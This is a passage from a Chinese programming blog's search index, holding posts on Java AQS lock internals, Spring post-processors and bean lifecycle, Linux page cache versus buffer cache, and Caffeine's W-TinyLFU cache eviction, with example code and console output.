中的一组即可。AQS也支持自定义同步器同时实现独占和共享两种方式，如ReentrantReadWriteLock。ReentrantLock是独占锁。\nAQS核心思想是：如果被请求的共享资源（state）空闲，那么就将当前请求资源的线程设置为有效的工作线程，将共享资源设置为锁定状态；如果共享资源被占用，就需要一定的阻塞等待唤醒机制来保证锁分配。这个机制主要用的是CLH队列的变体实现的，将暂时获取不到锁的线程加入到队列中。\nCLH：Craig, Landin, and Hagersten队列，是单向链表，AQS中的队列是CLH变体的虚拟双向队列（FIFO），AQS是通过将每条请求共享资源的线程封装成一个节点来实现锁的分配。\n主要原理图如下：\nAQS使用一个Volatile的int类型的成员变量state来表示同步状态，通过内置的FIFO队列来完成资源获取的排队工作，通过CAS完成对State值的修改。\n获得锁 acquire()是独占模式下线程获取共享资源的顶层入口。如果获取到资源，线程直接返回，否则进入等待队列，直到获取到资源为止，且整个过程忽略中断的影响。获取到资源后，线程就可以去执行其临界区代码了。\npublic final void acquire(int arg) { if (!tryAcquire(arg) \u0026amp;\u0026amp; acquireQueued(addWaiter(Node.EXCLUSIVE), arg)) selfInterrupt(); } 如果再有线程要获取锁，依次在队列中往后排队即可。\ntryAcquire()方法尝试去获取独占资源。如果获取成功，则直接返回true，否则直接返回false。需自定义同步器去实现\nprotected boolean tryAcquire(int arg) { throw new UnsupportedOperationException(); } AQS只是一个框架，具体资源的获取/释放方式交由自定义同步器去实现吗。AQS这里只定义了一个接口，具体资源的获取交由自定义同步器去实现了（通过state的get/set/CAS）！！！至于能不能重入，能不能加塞，那就看具体的自定义同步器怎么去设计了！！\naddWaiter(Node)此方法用于将当前线程加入到等待队列的队尾，并返回当前线程所在的结点。\nprivate Node addWaiter(Node mode) { //以给定模式构造结点。mode有两种：EXCLUSIVE（独占）和SHARED（共享）  Node node = new Node(Thread.currentThread(), mode); //尝试快速方式直接放到队尾。  Node pred = tail; if (pred != null) { node.prev = pred; if (compareAndSetTail(pred, node)) { pred.next = node; return node; } } //上一步失败则通过enq入队。  enq(node); return node; } enq(Node)方法用于将node加入队尾。\nprivate Node enq(final Node node) { //CAS\u0026#34;自旋\u0026#34;，直到成功加入队尾  for (;;) { Node t = tail; if (t == null) { // 队列为空，创建一个空的标志结点作为head结点，并将tail也指向它。  if (compareAndSetHead(new Node())) tail = head; } else {//正常流程，放入队尾  node.prev = t; if (compareAndSetTail(t, node)) { t.next = node; return t; } } } } 通过tryAcquire()和addWaiter()，该线程获取资源失败，已经被放入等待队列尾部了。聪明的你立刻应该能想到该线程下一部该干什么了吧：进入等待状态休息，直到其他线程彻底释放资源后唤醒自己，自己再拿到资源，然后就可以去干自己想干的事了。\nfinal boolean acquireQueued(final Node node, int arg) { boolean failed = true;//标记是否成功拿到资源  try { boolean interrupted = false;//标记等待过程中是否被中断过  //又是一个“自旋”！  for (;;) { final Node p = node.predecessor();//拿到前驱  //如果前驱是head，即该结点已成老二，那么便有资格去尝试获取资源（可能是老大释放完资源唤醒自己的，当然也可能被interrupt了）。  if (p == head \u0026amp;\u0026amp; tryAcquire(arg)) { setHead(node);//拿到资源后，将head指向该结点。所以head所指的标杆结点，就是当前获取到资源的那个结点或null。  p.next = null; // setHead中node.prev已置为null，此处再将head.next置为null，就是为了方便GC回收以前的head结点。也就意味着之前拿完资源的结点出队了！  failed = false; // 成功获取资源  return interrupted;//返回等待过程中是否被中断过  } //如果自己可以休息了，就通过park()进入waiting状态，直到被unpark()。如果不可中断的情况下被中断了，那么会从park()中醒过来，发现拿不到资源，从而继续进入park()等待。  if (shouldParkAfterFailedAcquire(p, node) \u0026amp;\u0026amp; parkAndCheckInterrupt()) interrupted = true;//如果等待过程中被中断过，哪怕只有那么一次，就将interrupted标记为true  } } finally { if (failed) // 如果等待过程中没有成功获取资源（如timeout，或者可中断的情况下被中断了），那么取消结点在队列中的等待。  cancelAcquire(node); } } Node2自旋查看前置节点，直到前置节点执行完成状态修改为CANCELLED，然后断开前置节点的链接，获取资源开始执行。\n再来总结下它的流程吧：\n 调用自定义同步器的tryAcquire()尝试直接去获取资源，如果成功则直接返回； 没成功，则addWaiter()将该线程加入等待队列的尾部，并标记为独占模式； acquireQueued()使线程在等待队列中休息，有机会时（轮到自己，会被unpark()）会去尝试获取资源。获取到资源后才返回。如果在整个等待过程中被中断过，则返回true，否则返回false。 如果线程在等待过程中被中断过，它是不响应的。只是获取资源后才再进行自我中断selfInterrupt()，将中断补上。  由于此函数是重中之重，我再用流程图总结一下：\n释放锁 release()方法是独占模式下线程释放共享资源的顶层入口。它会释放指定量的资源，如果彻底释放了（即state=0）,它会唤醒等待队列里的其他线程来获取资源。\npublic final boolean release(int arg) { if (tryRelease(arg)) { Node h = head;//找到头结点  if (h != null \u0026amp;\u0026amp; h.waitStatus != 0) unparkSuccessor(h);//唤醒等待队列里的下一个线程  return true; } return false; } 逻辑并不复杂。它调用tryRelease()来释放资源。有一点需要注意的是，它是根据tryRelease()的返回值来判断该线程是否已经完成释放掉资源了！所以自定义同步器在设计tryRelease()的时候要明确这一点！！\ntryRelease()方法尝试去释放指定量的资源。需自定义同步器去实现\nprotected boolean tryRelease(int arg) { throw new UnsupportedOperationException(); } 跟tryAcquire()一样，这个方法是需要独占模式的自定义同步器去实现的。正常来说，tryRelease()都会成功的，因为这是独占模式，该线程来释放资源，那么它肯定已经拿到独占资源了，直接减掉相应量的资源即可(state-=arg)，也不需要考虑线程安全的问题。但要注意它的返回值，上面已经提到了，release()是根据tryRelease()的返回值来判断该线程是否已经完成释放掉资源了！所以自义定同步器在实现时，如果已经彻底释放资源(state=0)，要返回true，否则返回false。\nprivate void unparkSuccessor(Node node) { //这里，node一般为当前线程所在的结点。  int ws = node.waitStatus; if (ws \u0026lt; 0)//置零当前线程所在的结点状态，允许失败。  compareAndSetWaitStatus(node, ws, 0); Node s = node.next;//找到下一个需要唤醒的结点s  if (s == null || s.waitStatus \u0026gt; 0) {//如果为空或已取消  s = null; for (Node t = tail; t != null \u0026amp;\u0026amp; t != node; t = t.prev) // 从后向前找。  if (t.waitStatus \u0026lt;= 0)//从这里可以看出，\u0026lt;=0的结点，都是还有效的结点。  s = t; } if (s != null) LockSupport.unpark(s.thread);//唤醒 } 这个函数并不复杂。一句话概括：用unpark()唤醒等待队列中最前边的那个未放弃线程。\nAQS实现非公平和公平 公平锁和非公平锁在于hasQueuedPredecessors()这个方法。hasQueuedPredecessors是公平锁加锁时判断等待队列中是否存在有效节点的方法。如果返回False，说明当前线程可以争取共享资源；如果返回True，说明队列中存在有效节点，当前线程必须加入到等待队列中。\npublic final boolean hasQueuedPredecessors() { // The correctness of this depends on head being initialized  // before tail and on head.next being accurate if the current  // thread is first in queue.  Node t = tail; // Read fields in reverse initialization order  Node h = head; Node s; // 头节点不是尾节点  // 第一个节点不为空  // 当前节点是头节点  return h != t \u0026amp;\u0026amp; ((s = h.next) == null || s.thread != Thread.currentThread()); } 线程在doAcquireNanos方法中获取锁时，会先加入同步队列，之后根据情况再陷入阻塞。当阻塞后的节点一段时间后醒来时，这时候来了更多的新线程来抢锁，这些新线程还没有加入到同步队列中去，也就是在tryAcquire方法中获取锁。\n在公平锁下，这些新线程会发现同步队列中存在节点等待，那么这些新线程将无法获取到锁，去排队；\n而在非公平锁下，这些新线程会跟排队苏醒的线程进行锁争抢，失败的去同步队列中排队。因此这里的公平与否，针对的其实是苏醒线程与还未加入同步队列的线程，而对于已经在同步队列中阻塞的线程而言，它们内部自身其实是公平的，因为它们是按顺序被唤醒的，这是根据AQS节点唤醒机制和同步队列的FIFO特性决定的。\n自定义同步工具 了解AQS基本原理以后，按照上面所说的AQS知识点，自己实现一个同步工具。\npublic class LeeLock { private static class Sync extends AbstractQueuedSynchronizer { @Override protected boolean tryAcquire (int arg) { return compareAndSetState(0, 1); } @Override protected boolean tryRelease (int arg) { setState(0); return true; } @Override protected boolean isHeldExclusively () { return getState() == 1; } } private Sync sync = new Sync(); public void lock () { sync.acquire(1); } public void unlock () { sync.release(1); } } 通过我们自己定义的Lock完成一定的同步功能。\npublic class LeeMain { static int count = 0; static LeeLock leeLock = new LeeLock(); public static void main (String[] args) throws InterruptedException { Runnable runnable = new Runnable() { @Override public void run () { try { leeLock.lock(); for (int i = 0; i \u0026lt; 10000; i++) { count++; } } catch (Exception e) { e.printStackTrace(); } finally { leeLock.unlock(); } } }; Thread thread1 = new Thread(runnable); Thread thread2 = new Thread(runnable); thread1.start(); thread2.start(); thread1.join(); thread2.join(); System.out.println(count); } } 上述代码每次运行结果都会是20000。通过简单的几行代码就能实现同步功能，这就是AQS的强大之处。\n参考 Java并发之AQS详解 并发之AQS原理(二) CLH队列与Node解析 从ReentrantLock的实现看AQS的原理及应用 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/aqs/","series":["Manual"],"tags":["Java"],"title":"AQS"},{"categories":["编程思想"],"content":"Spring Boot系列二 Spring @Async异步线程池用法总结 springboot利用@Async提升API接口并发能力 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/spring/async/","series":["Manual"],"tags":["Spring"],"title":"Async"},{"categories":["编程思想"],"content":"BeanFactoryPostProcessor工作在Bean实例化之前，BeanPostProcessor工作在Bean初始化方法前后。\nBeanFactoryPostProcessor和BeanPostProcessor，这两个接口，都是Spring初始化bean时对外暴露的扩展点。两个接口名称看起来很相似，但作用及使用场景却不同，分析如下：\n1. BeanFactoryPostProcessor接口 该接口的定义如下：\n@FunctionalInterface public interface BeanFactoryPostProcessor { /** * Modify the application context\u0026#39;s internal bean factory after its standard * initialization. All bean definitions will have been loaded, but no beans * will have been instantiated yet. This allows for overriding or adding * properties even to eager-initializing beans. * @param beanFactory the bean factory used by the application context * @throws org.springframework.beans.BeansException in case of errors */ void postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory) throws BeansException; } 实现该接口，可以在spring的bean创建之前，修改bean的定义属性。也就是说，Spring允许BeanFactoryPostProcessor在容器实例化任何其它bean之前读取配置元数据，并可以根据需要进行修改，例如可以把bean的scope从singleton改为prototype，也可以把property的值给修改掉。可以同时配置多个BeanFactoryPostProcessor，并通过设置\u0026rsquo;order\u0026rsquo;属性来控制各个BeanFactoryPostProcessor的执行次序。\n 注意：BeanFactoryPostProcessor是在spring容器加载了bean的定义文件之后，在bean实例化之前执行的。接口方法的入参是ConfigurrableListableBeanFactory，使用该参数，可以获取到相关bean的定义信息。\n 2. BeanPostProcessor接口 该接口的定义如下：\npublic interface BeanPostProcessor { /** * Apply this {@code BeanPostProcessor} to the given new bean instance \u0026lt;i\u0026gt;before\u0026lt;/i\u0026gt; any bean * initialization callbacks (like InitializingBean\u0026#39;s {@code afterPropertiesSet} * or a custom init-method). The bean will already be populated with property values. * The returned bean instance may be a wrapper around the original. * \u0026lt;p\u0026gt;The default implementation returns the given {@code bean} as-is. * @param bean the new bean instance * @param beanName the name of the bean * @return the bean instance to use, either the original or a wrapped one; * if {@code null}, no subsequent BeanPostProcessors will be invoked * @throws org.springframework.beans.BeansException in case of errors * @see org.springframework.beans.factory.InitializingBean#afterPropertiesSet */ @Nullable default Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException { return bean; } /** * Apply this {@code BeanPostProcessor} to the given new bean instance \u0026lt;i\u0026gt;after\u0026lt;/i\u0026gt; any bean * initialization callbacks (like InitializingBean\u0026#39;s {@code afterPropertiesSet} * or a custom init-method). The bean will already be populated with property values. * The returned bean instance may be a wrapper around the original. * \u0026lt;p\u0026gt;In case of a FactoryBean, this callback will be invoked for both the FactoryBean * instance and the objects created by the FactoryBean (as of Spring 2.0). The * post-processor can decide whether to apply to either the FactoryBean or created * objects or both through corresponding {@code bean instanceof FactoryBean} checks. * \u0026lt;p\u0026gt;This callback will also be invoked after a short-circuiting triggered by a * {@link InstantiationAwareBeanPostProcessor#postProcessBeforeInstantiation} method, * in contrast to all other {@code BeanPostProcessor} callbacks. * \u0026lt;p\u0026gt;The default implementation returns the given {@code bean} as-is. * @param bean the new bean instance * @param beanName the name of the bean * @return the bean instance to use, either the original or a wrapped one; * if {@code null}, no subsequent BeanPostProcessors will be invoked * @throws org.springframework.beans.BeansException in case of errors * @see org.springframework.beans.factory.InitializingBean#afterPropertiesSet * @see org.springframework.beans.factory.FactoryBean */ @Nullable default Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException { return bean; } } BeanPostProcessor，可以在spring容器实例化bean之后，在执行bean的初始化方法前后，添加一些自己的处理逻辑。这里说的初始化方法，指的是下面两种：\n1）bean实现了InitializingBean接口，对应的方法为afterPropertiesSet\n2）在bean定义的时候，通过init-method设置的方法\n 注意：BeanPostProcessor是在spring容器加载了bean的定义文件并且实例化bean之后执行的。BeanPostProcessor的执行顺序是在BeanFactoryPostProcessor之后。\n 3. 实战 BeanFactoryPostProcessor\npublic class MyBeanFactoryPostProcessor implements BeanFactoryPostProcessor { @Override public void postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory) throws BeansException { System.out.println(\u0026#34;1. 调用BeanFactoryPostProcessor的postProcessBeanFactory\u0026#34;); BeanDefinition bd = beanFactory.getBeanDefinition(\u0026#34;myJavaBean\u0026#34;); MutablePropertyValues pv = bd.getPropertyValues(); pv.addPropertyValue(\u0026#34;remark\u0026#34;, \u0026#34;BeanFactoryPostProcessor中修改之后的remark\u0026#34;); } } BeanPostProcessor\npublic class MyBeanPostProcessor implements BeanPostProcessor { @Override public Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException { if (\u0026#34;myJavaBean\u0026#34;.equals(beanName)){ System.out.println(\u0026#34;3. 调用BeanPostProcessor.postProcessBeforeInitialization\u0026#34;); } return bean; } @Override public Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException { if (\u0026#34;myJavaBean\u0026#34;.equals(beanName)){ System.out.println(\u0026#34;7. 调用BeanPostProcessor.postProcessAfterInitialization\u0026#34;); } return bean; } } 配置类\n@Configuration public class MyConfig { @Bean(initMethod = \u0026#34;initMethod\u0026#34;, destroyMethod = \u0026#34;destroyMethod\u0026#34;) public MyJavaBean myJavaBean() { MyJavaBean bean = new MyJavaBean(); bean.setRemark(\u0026#34;原始remark\u0026#34;); return bean; } @Bean public MyBeanFactoryPostProcessor myBeanFactoryPostProcessor(){ return new MyBeanFactoryPostProcessor(); } @Bean public MyBeanPostProcessor myBeanPostProcessor(){ return new MyBeanPostProcessor(); } } Bean\npublic class MyJavaBean implements InitializingBean, DisposableBean { private String desc; private String remark; public MyJavaBean() { System.out.println(\u0026#34;2 Bean的无参构造函数\u0026#34;); } public MyJavaBean(String desc, String remark) { this.desc = desc; this.remark = remark; System.out.println(\u0026#34;2 Bean的全参构造函数\u0026#34;); } @PostConstruct public void postConstruct() { System.out.println(\u0026#34;4. 调用PostConstruct方法\u0026#34;); } public String getDesc() { return desc; } public void setDesc(String desc) { System.out.println(\u0026#34;调用setDesc方法\u0026#34;); this.desc = desc; } public String getRemark() { return remark; } public void setRemark(String remark) { System.out.println(\u0026#34;调用setRemark方法\u0026#34;); this.remark = remark; System.out.println(\u0026#34;remark = \u0026#34; + this.remark); } @Override public void afterPropertiesSet() throws Exception { System.out.println(\u0026#34;5. 调用InitializingBean.afterPropertiesSet方法\u0026#34;); this.desc = \u0026#34;afterPropertiesSet中修改之后的desc\u0026#34;; } public void initMethod() { System.out.println(\u0026#34;6. 调用Bean的init方法\u0026#34;); } @Override public void destroy() throws Exception { System.out.println(\u0026#34;8. 调用DisposableBean.destroy\u0026#34;); } public void destroyMethod() { System.out.println(\u0026#34;9. 调用Bean的destroy方法\u0026#34;); } @Override public String toString() { StringBuilder builder = new StringBuilder(); builder.append(\u0026#34;[desc：\u0026#34;).append(desc); builder.append(\u0026#34;， remark：\u0026#34;).append(remark).append(\u0026#34;]\u0026#34;); return builder.toString(); } } 启动类\n@SpringBootApplication public class PostProcessorApplication { public static void main(String[] args) { ApplicationContext applicationContext = SpringApplication.run(PostProcessorApplication.class, args); MyJavaBean bean = (MyJavaBean) applicationContext.getBean(\u0026#34;myJavaBean\u0026#34;); System.out.println(\u0026#34;=======================结果====================\u0026#34;); System.out.println(\u0026#34;desc：\u0026#34; + bean.getDesc()); System.out.println(\u0026#34;remark：\u0026#34; + bean.getRemark()); System.out.println(\u0026#34;======================结果====================\u0026#34;); } } 执行顺序：\n1. 调用BeanFactoryPostProcessor的postProcessBeanFactory 2 Bean的无参构造函数 调用setRemark方法 remark = 原始remark 调用setRemark方法 remark = BeanFactoryPostProcessor中修改之后的remark ******beanName = myJavaBean ******beanFactory = org.springframework.beans.factory.support.DefaultListableBeanFactory ******applicationContext = org.springframework.context.annotation.AnnotationConfigApplicationContext 3. 调用BeanPostProcessor.postProcessBeforeInitialization 4. 调用PostConstruct方法 5. 调用InitializingBean.afterPropertiesSet方法 6. 调用Bean的init方法 7. 调用BeanPostProcessor.postProcessAfterInitialization =======================结果==================== desc：afterPropertiesSet中修改之后的desc remark：BeanFactoryPostProcessor中修改之后的remark ======================结果==================== 8. 调用DisposableBean.destroy 9. 调用Bean的destroy方法  BeanFactoryPostProcessor对Bean属性的修改延迟到了Bean初始化完成之后才执行\n 4. 进一步深入分析 在使用ApplicationContext启动spring容器的时候，在AbstractApplicationContext.refresh()方法中，完成相关初始化工作：\n1）BeanFactoryPostProcessor.postProcessBeanFactory，是在第5步执行的\n2）而BeanPostProcessor的执行，取决于配置文件中bean的定义，如果定义的bean是singleton并且不是抽象类，也不延迟初始化，则BeanPostProcessor是在第11步中执行；而对于prototype的bean，BeanPostProcessor是在程序getBean的时候执行的。在第6步中，调用registerBeanPostProcessors方法，注册所有实现BeanPostProcessor接口的bean\n5. 总结  创建（调用构造函数） set属性（set方法注入属性） 判断是否实现BeanNameAware接口，并调用接口的setBeanName方法 判断是否实现BeanFactoryAware接口，并调用接口的setBeanFactory方法 判断是否实现ApplicationContextAware接口，并调用接口的setApplicationContext方法 判断是否实现BeanPostProcessor接口，并调用接口的postProcessBeforeInitialization方法 判断是否实现InitializingBean接口，并调用接口的afterPropertiesSet方法 判断是否自定义init方法，并调用 判断是否实现BeanPostProcessor接口（同6），并调用接口的postProcessAfterInitialization方法 业务代码中Bean对象的使用 当容器销毁时，判断是否实现DisposableBean接口，并调用接口的destroy方法 判断是否自定义销毁方法，并调用  对于 BeanNameAware BeanFactoryAware ApplicationContextAware 这3个接口我们平时很少实现它，一般用于让Bean能够感知到BeanName BeanFactory ApplicationContext\npublic class MyJavaBean implements BeanNameAware, BeanFactoryAware, ApplicationContextAware { private String beanName; private BeanFactory beanFactory; private ApplicationContext applicationContext; @Override public void setBeanName(String s) { this.beanName = s; System.out.println(\u0026#34;******beanName = \u0026#34; + this.beanName); } @Override public void setBeanFactory(BeanFactory beanFactory) throws BeansException { this.beanFactory = beanFactory; System.out.println(\u0026#34;******beanFactory = \u0026#34; + this.beanFactory); } @Override public void setApplicationContext(ApplicationContext applicationContext) throws BeansException { this.applicationContext = applicationContext; System.out.println(\u0026#34;******applicationContext = \u0026#34; + this.applicationContext); } } 参考 Spring的BeanFactoryPostProcessor和BeanPostProcessor ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/spring/beanfactorypostprocessor%E5%92%8Cbeanpostprocessor/","series":["Manual"],"tags":["Spring"],"title":"BeanFactoryPostProcessor和BeanPostProcessor"},{"categories":["编程思想"],"content":"实例化 -\u0026gt; 属性赋值 -\u0026gt; 初始化 -\u0026gt; 销毁\n参考链接 请别再问Spring Bean的生命周期了！ Spring Bean的生命周期（非常详细） ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/spring/bean%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/","series":["Manual"],"tags":["Spring"],"title":"bean生命周期"},{"categories":["计算机科学"],"content":"首先我们使用 free -m 查看系统内存的使用情况：\n可以看出，系统内存为 16G，Swap 内存 16G，mem free 虽然显示为 1118，因缓存的存在，不能认为系统目前内剩下这么多内存。而应该把 buffers、cached 的也算上，即 free+cached+buffers=1118+7110+430＝8658，总内存再减去 8658＝7314，与 buffers/cache 行中对应 free 列的 7312 和 8659 基本一致。\n 这里顺便介绍一下Swap，了解Swap更多详情请移步 👉 Swap交换分区概念   Linux内核为了提高读写效率与速度，会将文件在内存中进行缓存，这部分内存就是Cache Memory(缓存内存)。即使你的程序运行结束后，Cache Memory也不会自动释放。这就会导致你在Linux系统中程序频繁读写文件后，你会发现可用物理内存变少。当系统的物理内存不够用的时候，就需要将物理内存中的一部分空间释放出来，以供当前运行的程序使用。那些被释放的空间可能来自一些很长时间没有什么操作的程序，这些被释放的空间被临时保存到Swap空间中，等到那些程序要运行时，再从Swap分区中恢复保存的数据到内存中。这样，系统总是在物理内存不够时，才进行Swap交换。\n 从Linux kernel version 2.4开始，buffer/cache合并（详情见 👉 Linux IO的buffer cache和page cache合并的原因 ），所以同样使用 free -m 看到的是：\n[root@k8s-node3 ~]# free -m total used free shared buff/cache available Mem: 7820 6577 147 30 1095 907 Swap: 0 0 0  使用 hostnamectl 或者 cat /proc/version 可以查看内核版本：\n  [root@k8s-node3 ~]# hostnamectl Static hostname: k8s-node3 Pretty hostname: VM-0-4-centos Icon name: computer-vm Chassis: vm Machine ID: 8a248d59684442b3a2edd315013b7d1f Boot ID: c14dd5b3b84646a58a98db62d5379832 Virtualization: kvm Operating System: CentOS Linux 7 (Core) CPE OS Name: cpe:/o:centos:centos:7 Kernel: Linux 3.10.0-1127.19.1.el7.x86_64 Architecture: x86-64 [root@k8s-node3 ~]# cat /proc/version Linux version 3.10.0-1127.19.1.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-39) (GCC) ) #1 SMP Tue Aug 25 17:23:54 UTC 2020  我们假设buffer/cache还没发生合并，那它们之间的区别是什么呢？\n这里罗列几个高赞👍知乎回答：\nCache 和 Buffer 都是缓存，主要区别是什么？   cache 是为了弥补高速设备和低速设备的鸿沟而引入的中间层，最终起到加快访问速度的作用。 而 buffer 的主要目的进行流量整形，把突发的大数量较小规模的 I/O 整理成平稳的小数量较大规模的 I/O，以减少响应次数（比如从网上下电影，你不能下一点点数据就写一下硬盘，而是积攒一定量的数据以后一整块一起写，不然硬盘都要被你玩坏了）。   Linux系统中的Page cache和Buffer cache  磁盘的操作有逻辑级（文件系统）和物理级（磁盘块），这两种Cache就是分别缓存逻辑和物理级数据的。\n假设我们通过文件系统操作文件，那么文件将被缓存到Page Cache，如果需要刷新文件的时候，Page Cache将交给Buffer Cache去完成，因为Buffer Cache就是缓存磁盘块的。\n也就是说，直接去操作文件，那就是Page Cache区缓存，用dd等命令直接操作磁盘块，就是Buffer Cache缓存的东西。\nPage cache实际上是针对文件系统的，是文件的缓存，在文件层面上的数据会缓存到page cache。文件的逻辑层需要映射到实际的物理磁盘，这种映射关系由文件系统来完成。当page cache的数据需要刷新时，page cache中的数据交给buffer cache，但是这种处理在2.6版本的内核之后就变的很简单了，没有真正意义上的cache操作。\nBuffer cache是针对磁盘块的缓存，也就是在没有文件系统的情况下，直接对磁盘进行操作的数据会缓存到buffer cache中，例如，文件系统的元数据都会缓存到buffer cache中。\n简单说来，page cache用来缓存文件数据，buffer cache用来缓存磁盘数据。在有文件系统的情况下，对文件操作，那么数据会缓存到page cache，如果直接采用dd等工具对磁盘进行读写，那么数据会缓存到buffer cache。\nBuffer(Buffer Cache)以块形式缓冲了块设备的操作，定时或手动的同步到硬盘，它是为了缓冲写操作然后一次性将很多改动写入硬盘，避免频繁写硬盘，提高写入效率。\nCache(Page Cache)以页面形式缓存了文件系统的文件，给需要使用的程序读取，它是为了给读操作提供缓冲，避免频繁读硬盘，提高读取效率。\n 参考 Linux 操作系统原理 — 内存 — Cache 和 Buffer Linux系统中的Page cache和Buffer cache Cache 和 Buffer 都是缓存，主要区别是什么？ [Swap交换分区概念](\n","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/cs/system/cache%E5%92%8Cbuffer/","series":["Manual"],"tags":["CS","System"],"title":"cache和buffer"},{"categories":["计算机科学"],"content":"针对LFU存在记录访问频次的开销、对突发稀疏流量无能为力的现状；TinyLFU运用Count–Min Sketch 算法、保鲜机制尝试解决，它解决了一个问题，但它仍然无法较好的处理突发性的稀疏流量；TinyLFU之所以无法解决问题2，是因为新的记录（new items）还没来得及建立足够的频率就被剔除出去了，这就使得命中率下降，Window Tiny LFU使用3个LRU队列解决了这个问题，同时Caffeine使用了RingBuffer数据结构、WAL思想也是其高效的重要原因。\n1. LRU 和 LFU 的缺点  LRU 实现简单，在一般情况下能够表现出很好的命中率，是一个“性价比”很高的算法，平时也很常用。虽然 LRU 对突发性的稀疏流量（sparse bursts）表现很好，但同时也会产生缓存污染，举例来说，如果偶然性的要对全量数据进行遍历，那么“历史访问记录”就会被刷走，造成污染。 如果数据的分布在一段时间内是固定的话，那么 LFU 可以达到最高的命中率。但是 LFU 有两个缺点，第一，它需要给每个记录项维护频率信息，每次访问都需要更新，这是个巨大的开销；第二，对突发性的稀疏流量无力，因为前期经常访问的记录已经占用了缓存，偶然的流量不太可能会被保留下来，而且过去的一些大量被访问的记录在将来也不一定会使用上，这样就一直把“坑”占着了。  无论 LRU 还是 LFU 都有其各自的缺点，不过，现在已经有很多针对其缺点而改良、优化出来的变种算法。\n2. TinyLFU TinyLFU 就是其中一个优化算法，它是专门为了解决 LFU 上述提到的两个问题而被设计出来的。\n解决第一个问题是采用了 Count–Min Sketch 算法。\n解决第二个问题是让记录尽量保持相对的“新鲜”（Freshness Mechanism），并且当有新的记录插入时，可以让它跟老的记录进行“PK”，输者就会被淘汰，这样一些老的、不再需要的记录就会被剔除。\n2.1 统计频率 Count–Min Sketch 算法 如何对一个 key 进行统计，但又可以节省空间呢？（不是简单的使用HashMap，这太消耗内存了），注意哦，不需要精确的统计，只需要一个近似值就可以了，怎么样，这样场景是不是很熟悉，如果你是老司机，或许已经联想到布隆过滤器（Bloom Filter）的应用了。\n没错，将要介绍的 Count–Min Sketch 的原理跟 Bloom Filter 一样，只不过 Bloom Filter 只有 0 和 1 的值，那么你可以把 Count–Min Sketch 看作是“数值”版的 Bloom Filter。\n如果需要记录一个值，那我们需要通过多种Hash算法对其进行处理hash，然后在对应的hash算法的记录中+1，为什么需要多种hash算法呢？由于这是一个压缩算法必定会出现冲突，比如我们建立一个Long的数组，通过计算出每个数据的hash的位置。比如张三和李四，他们俩有可能hash值都是相同，比如都是1那Long[1]这个位置就会增加相应的频率，张三访问1万次，李四访问1次那Long[1]这个位置就是1万零1，如果取李四的访问评率的时候就会取出是1万零1，但是李四命名只访问了1次啊，为了解决这个问题，所以用了多个hash算法可以理解为long[][]二维数组的一个概念，比如在第一个算法张三和李四冲突了，但是在第二个，第三个中很大的概率不冲突，比如一个算法大概有1%的概率冲突，那四个算法一起冲突的概率是1%的四次方。通过这个模式我们取李四的访问率的时候取所有算法中，李四访问最低频率的次数。所以他的名字叫Count-Min Sketch。\n2.2 保鲜机制 为了让缓存保持“新鲜”，剔除掉过往频率很高但之后不经常的缓存，Caffeine 有一个 Freshness Mechanism。做法很简答，就是当整体的统计计数（当前所有记录的频率统计之和，这个数值内部维护）达到某一个值时，那么所有记录的频率统计除以 2。\n3. Window Tiny LFU Caffeine 通过测试发现 TinyLFU 在面对突发性的稀疏流量（sparse bursts）时表现很差，因为新的记录（new items）还没来得及建立足够的频率就被剔除出去了，这就使得命中率下降。\n于是 Caffeine 设计出一种新的 policy，即 Window Tiny LFU（W-TinyLFU），并通过实验和实践发现 W-TinyLFU 比 TinyLFU 表现的更好。\nW-TinyLFU 的设计如下所示（两图等价）：\n它主要包括两个缓存模块，主缓存是 SLRU（Segmented LRU，即分段 LRU），SLRU 包括一个名为 protected 和一个名为 probation 的缓存区。通过增加一个缓存区（即 Window Cache），当有新的记录插入时，会先在 window 区呆一下，就可以避免上述说的 sparse bursts 问题。\n3.1 数据淘汰策略 在caffeine所有的数据都在ConcurrentHashMap中，这个和guava cache不同，guava cache是自己实现了个类似ConcurrentHashMap的结构。在caffeine中有三个记录引用的LRU队列:\n Eden队列：在caffeine中规定只能为缓存容量的1%，如果size=100，那这个队列的有效大小就等于1。这个队列中记录的是新到的数据，防止突发流量由于之前没有访问频率，而导致被淘汰。比如有一部新剧上线，在最开始其实是没有访问频率的，防止上线之后被其他缓存淘汰出去，而加入这个区域。伊甸区，最舒服最安逸的区域，在这里很难被其他数据淘汰。 Probation队列：叫做缓刑队列，在这个队列就代表你的数据相对比较冷，马上就要被淘汰了。这个有效大小为size减去eden减去protected。 Protected队列：在这个队列中，可以稍微放心一下了，你暂时不会被淘汰，但是别急，如果Probation队列没有数据了或者Protected数据满了，你也将会被面临淘汰的尴尬局面。当然想要变成这个队列，需要把Probation访问一次之后，就会提升为Protected队列。这个有效大小为(size减去eden) * 80% 如果size =100，就会是79。  这三个队列关系如下:\n 所有的新数据都会进入Eden。 Eden满了，淘汰进入Probation。 如果在Probation中访问了其中某个数据，则这个数据升级为Protected。 如果Protected满了又会继续降级为Probation。  对于发生数据淘汰的时候，会从Probation中进行淘汰。会把这个队列中的数据队头称为受害者，这个队头肯定是最早进入的，按照LRU队列的算法的话那他其实他就应该被淘汰，但是在这里只能叫他受害者，这个队列是缓刑队列，代表马上要给他行刑了。这里会取出队尾叫候选者，也叫攻击者。这里受害者会和攻击者皇城PK决出我们应该被淘汰的。\n通过我们的Count-Min Sketch中的记录的频率数据有以下几个判断:\n  如果攻击者大于受害者，那么受害者就直接被淘汰。\n  